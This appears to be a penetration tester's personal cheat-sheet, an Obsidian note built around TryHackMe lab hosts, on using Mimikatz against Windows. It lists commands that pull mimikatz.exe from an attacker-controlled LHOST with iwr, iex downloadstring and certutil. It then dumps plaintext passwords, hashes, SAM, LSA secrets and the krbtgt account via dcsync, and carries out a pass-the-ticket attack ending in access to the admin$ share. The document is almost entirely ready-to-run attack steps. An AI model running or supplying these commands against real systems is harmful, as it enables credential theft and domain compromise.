
copy it to current folder
```powershell
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
```

start a python server
```powershell
python3 -m http.server 80
```

download it 
```powershell
iwr -uri http://<% tp.frontmatter["LHOST"] %>/mimikatz.exe -Outfile mimikatz.exe
powershell -c "Invoke-WebRequest -Uri 'http://<% tp.frontmatter["LHOST"] %>/mimikatz.exe' -OutFile 'C:\Users\Public\mimikatz.exe'"
iex(new-object net.webclient).downloadstring("http://<% tp.frontmatter["LHOST"] %>/mimikatz.exe")
certutil -urlcache -split -f "http://<% tp.frontmatter["LHOST"] %>/mimikatz.exe" 'C:\Users\Public\mimikatz.exe'
```
run it 
```powershell
C:\Users\Public\mimikatz.exe
```


```powershell
privilege::debug

token::elevate

sekurlsa::logonpasswords #hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch #both these dump SAM

#OneLiner
.\mimikatz_x64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz_x64.exe "privilege::debug" "sekurlsa::msv" "exit"
.\mimikatz_x64.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

```



## Pass the ticket attack
```powershell
.\mimikatz.exe
sekurlsa::tickets /export
```
![[Assets/Pasted image 20250512233924.png|500]]
```powershell
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
```
![[Assets/Pasted image 20250512234200.png|500]]
```powershell
klist
```
![[Assets/Pasted image 20250512234230.png|500]]
###### 1- connect as that user
```powershell
C:\tools\winrs.exe -r:THMIIS.za.tryhackme.com cmd
#replace "THMIIS.za.tryhackme.com" with the DC.domain.com or whatever you want to authenticate to
```
![[Assets/Pasted image 20250512234509.png|500]]
###### 2- check admin folder
```powershell
dir \\<RHOST>\admin$
```
reference : https://medium.com/@ria.banerjee005/pass-the-hash-pass-the-ticket-and-pass-the-key-attacks-d5bd09525871



